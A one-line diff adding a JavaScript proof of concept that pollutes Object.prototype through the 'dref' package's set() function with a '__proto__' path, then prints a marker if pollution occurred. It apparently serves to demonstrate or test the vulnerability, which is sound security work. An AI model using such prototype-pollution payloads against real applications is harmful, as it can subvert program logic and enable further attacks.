@@ -1,0 +1,1 @@
+require("dref").set({}, "__proto__.pollutedProperty", "exploitedValue"); console.log({}.pollutedProperty !== undefined ? '[POLLUTION_TRIGGERED]':'')
